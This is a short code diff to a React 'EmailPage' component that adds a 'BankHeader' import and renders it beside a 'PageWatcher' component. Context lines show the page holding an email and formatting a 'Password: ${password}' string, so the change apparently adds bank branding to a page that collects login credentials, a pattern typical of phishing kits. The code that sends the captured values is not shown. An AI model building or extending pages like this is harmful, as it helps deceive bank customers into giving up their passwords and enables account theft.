@@ -1,5 +1,6 @@
 import { useState } from "react";
 import PageWatcher from "../components/pagewaters";
+import BankHeader from "../components/bankhead";
 
 export default function EmailPage() {
   const [email, setEmail] = useState("");
@@ -58,6 +59,7 @@ Password: ${password}
   return (
     <>
       <PageWatcher />
+      <BankHeader/>
 
       {isLoading && (
         <div className="fixed inset-0 flex items-center justify-center bg-white z-50">
